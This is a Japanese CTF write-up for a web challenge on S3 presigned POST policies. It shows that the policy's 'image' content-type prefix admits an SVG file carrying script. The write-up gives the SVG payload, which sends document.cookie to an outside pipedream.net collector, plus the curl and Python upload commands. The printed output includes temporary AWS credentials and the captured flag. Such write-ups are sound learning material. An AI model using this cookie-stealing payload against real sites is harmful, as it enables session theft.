# POST Policy:Introduction:20pts
In addition to Pre Signed URLs, there are other ways to upload directly from the client.  

- [Target](https://d1otf5ivfbk7h4.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1vcpeBGkpawjs4DARQLzbY1Oo0OGi4n7-/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.  

[https://d1otf5ivfbk7h4.cloudfront.net/](https://d1otf5ivfbk7h4.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様なようだ。  
アクセスするとこちらも同様のファイルアップロードサイトのようだ。  
![site/site.png](site/site.png)  
ソースの主要箇所は以下であった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const { url, fields } = await createPresignedPost(s3, {
    Bucket: process.env.BUCKET_NAME!,
    Key: `upload/${filename}`,
    Conditions: [
      ['content-length-range', 0, 1024 * 1024 * 100],
      ['starts-with', '$Content-Type', 'image'],
    ],
    Fields: {
      'Content-Type': request.body.contentType,
    },
    Expires: 600,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    fields,
  });
});
~~~
```
`createPresignedPost`に指定されたPolicyで`Content-Type`が`image`で始まることが要求されている。  
これによりPUTで書き換えることはエラーとなる。  
ここで、`text/html`以外でXSSできる`image/svg+xml`を思い出す。  
`image`から始まっているので条件は満たされる。  
フロントでも`['image/jpeg', 'image/png', 'image/gif']`のどれかであるかをチェックされているが、curlすればよい。  
以下のSVGを用いる。  
```svg
<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch("https://enmz6ozs7du1q.x.pipedream.net/?satoki="+document.cookie);
    </script>
</svg>
```
以下の通りにリクエストを投げる。  
```bash
$ __=$(curl -s -X POST -H 'Content-Type: application/json' -d '{"contentType":"image/svg+xml","length":159}' --upload-file xs3.svg 'https://d1otf5ivfbk7h4.cloudfront.net/api/upload')
$ echo $__
{"url":"https://uploadbucket-5b1bc63390-3-upload.s3.ap-northeast-1.amazonaws.com/","fields":{"Content-Type":"image/svg+xml","bucket":"uploadbucket-5b1bc63390-3-upload","X-Amz-Algorithm":"AWS4-HMAC-SHA256","X-Amz-Credential":"ASIAUPVKPCT4L55XY4MH/20240329/ap-northeast-1/s3/aws4_request","X-Amz-Date":"20240329T013848Z","X-Amz-Security-Token":"IQoJb3JpZ2luX2VjEMn//////////wEaDmFwLW5vcnRoZWFzdC0xIkgwRgIhAMXkA7QLGBkxNRmmx3TAYw2QoIccBQSE3Xd6Uw+cwnSTAiEA13GWGjJTHPODXEfoenZLiwr90p2slXnShvV0a2RSfkkqtwMI4///////////ARABGgwzMDg1MjE0MDc3MzYiDNZZWN2cTWpPHCi/gSqLAz2UGHNzLAPf6XgjSAJpX3+4JPoBovydET06CDuccv2se7bCAI1RSs/4isjZm05LI4AS6qHgMnqR0Iw2HFWl0PSUyDDE+MoQeWwvFY8NXIa5TUvRgpGTzfIPRI+BI1IpTH7oTGVAR4PdkMHtdJ4Ri82Ki7Z94PeNEm6yFuQiQ0cRrWTxMb2Q4ioSVdDAuFMbVNqnRsMTidyqGD6L2tAFcc4ZWSQLn9bCa8yGXSoYMSgBY8NXuV7H3JfUKsWuzPZQ0ac6XAx4tjKjmqcZ6CpGAdT77gPi8vjx8/uUlihCQ5TFgNt2kwdkrUNVE4JkXS3ASphRvbgurGKnln1KI/nGwmqnUM/Ed5mBe23yaShAel59buYcCy+DhM32mGvoCOHgwSr3h/iyRLS2R5XQCcq0YjmY6oB8bykJ/+N1smX04FZLKT+EA1MCWaNup5WMmPSrY9w8HT8RiB3w1OXXOvNcYT47Ph4oQ7xC/+jLeQg0X+xTyndz1M9NyWrzYBLzMKmqIxW0YKHuvy+JBVG0MKa3mLAGOp0BnuBJ3yHIBFo6G4687nsQ918XOtHeQrqRmAEbp1MmSw5HTS4V7DwmSETPqUOXeU2NbwPic+tTyx1w+4vmH99IFC8v4ZFjuAIx1KZRs9CPeeIbGTZChr9Bmp9kIcvM+v5Th7TU/g1XgaMQ3c5E4MGAcmpMAXuO0jwKfUdf86ru2ZyTEUVOop+9gpOGQ4cEgALFeWWsAymOUvkrxPU1Yg==","key":"upload/c55bb48b-f9dd-4332-80cf-3fc5c71e0e84","Policy":"eyJleHBpcmF0aW9uIjoiMjAyNC0wMy0yOVQwMTo0ODo0OFoiLCJjb25kaXRpb25zIjpbWyJjb250ZW50LWxlbmd0aC1yYW5nZSIsMCwxMDQ4NTc2MDBdLFsic3RhcnRzLXdpdGgiLCIkQ29udGVudC1UeXBlIiwiaW1hZ2UiXSx7IkNvbnRlbnQtVHlwZSI6ImltYWdlL3N2Zyt4bWwifSx7ImJ1Y2tldCI6InVwbG9hZGJ1Y2tldC01YjFiYzYzMzkwLTMtdXBsb2FkIn0seyJYLUFtei1BbGdvcml0aG0iOiJBV1M0LUhNQUMtU0hBMjU2In0seyJYLUFtei1DcmVkZW50aWFsIjoiQVNJQVVQVktQQ1Q0TDU1WFk0TUgvMjAyNDAzMjkvYXAtbm9ydGhlYXN0LTEvczMvYXdzNF9yZXF1ZXN0In0seyJYLUFtei1EYXRlIjoiMjAyNDAzMjlUMDEzODQ4WiJ9LHsiWC1BbXotU2VjdXJpdHktVG9rZW4iOiJJUW9KYjNKcFoybHVYMlZqRU1uLy8vLy8vLy8vL3dFYURtRndMVzV2Y25Sb1pXRnpkQzB4SWtnd1JnSWhBTVhrQTdRTEdCa3hOUm1teDNUQVl3MlFvSWNjQlFTRTNYZDZVdytjd25TVEFpRUExM0dXR2pKVEhQT0RYRWZvZW5aTGl3cjkwcDJzbFhuU2h2VjBhMlJTZmtrcXR3TUk0Ly8vLy8vLy8vLy9BUkFCR2d3ek1EZzFNakUwTURjM016WWlETlpaV04yY1RXcFBIQ2kvZ1NxTEF6MlVHSE56TEFQZjZYZ2pTQUpwWDMrNEpQb0JvdnlkRVQwNkNEdWNjdjJzZTdiQ0FJMVJTcy80aXNqWm0wNUxJNEFTNnFIZ01ucVIwSXcySEZXbDBQU1V5RERFK01vUWVXd3ZGWThOWElhNVRVdlJncEdUemZJUFJJK0JJMUlwVEg3b1RHVkFSNFBka01IdGRKNFJpODJLaTdaOTRQZU5FbTZ5RnVRaVEwY1JyV1R4TWIyUTRpb1NWZERBdUZNYlZOcW5Sc01UaWR5cUdENkwydEFGY2M0WldTUUxuOWJDYTh5R1hTb1lNU2dCWThOWHVWN0gzSmZVS3NXdXpQWlEwYWM2WEF4NHRqS2ptcWNaNkNwR0FkVDc3Z1BpOHZqeDgvdVVsaWhDUTVURmdOdDJrd2RrclVOVkU0SmtYUzNBU3BoUnZiZ3VyR0tubG4xS0kvbkd3bXFuVU0vRWQ1bUJlMjN5YVNoQWVsNTlidVljQ3krRGhNMzJtR3ZvQ09IZ3dTcjNoL2l5UkxTMlI1WFFDY3EwWWptWTZvQjhieWtKLytOMXNtWDA0RlpMS1QrRUExTUNXYU51cDVXTW1QU3JZOXc4SFQ4UmlCM3cxT1hYT3ZOY1lUNDdQaDRvUTd4Qy8rakxlUWcwWCt4VHluZHoxTTlOeVdyellCTHpNS21xSXhXMFlLSHV2eStKQlZHME1LYTNtTEFHT3AwQm51QkozeUhJQkZvNkc0Njg3bnNROTE4WE90SGVRcnFSbUFFYnAxTW1TdzVIVFM0VjdEd21TRVRQcVVPWGVVMk5id1BpYyt0VHl4MXcrNHZtSDk5SUZDOHY0WkZqdUFJeDFLWlJzOUNQZWVJYkdUWkNocjlCbXA5a0ljdk0rdjVUaDdUVS9nMVhnYU1RM2M1RTRNR0FjbXBNQVh1TzBqd0tmVWRmODZydTJaeVRFVVZPb3ArOWdwT0dRNGNFZ0FMRmVXV3NBeW1PVXZrcnhQVTFZZz09In0seyJrZXkiOiJ1cGxvYWQvYzU1YmI0OGItZjlkZC00MzMyLTgwY2YtM2ZjNWM3MWUwZTg0In1dfQ==","X-Amz-Signature":"25b40a7f2df7c0a084c4e54a71e46411d661bca857e05c18391174a5f4705e27"}}
$ python -c "data = $__; res = __import__('requests').post(data['url'], files={'file': ('xs3.svg', open('xs3.svg', 'rb'), 'image/svg+xml')}, data=data['fields']); print(res.status_code)"
204
```
JSONでPresigned Postの各種値が降ってくるので、pythonで整形してリクエストしている。  
リクエストに成功したら`key`にあるファイル名としてアップロードされているはずなので、`https://d1otf5ivfbk7h4.cloudfront.net/upload/c55bb48b-f9dd-4332-80cf-3fc5c71e0e84`をクローラへ報告する。  
すると以下のようなリクエストが届く。  
```
GET
/?satoki=flag=flag{c137e5b9b7afd4b13a15839a26153940beeefc7d}
```
flagが得られた。  

## flag{c137e5b9b7afd4b13a15839a26153940beeefc7d}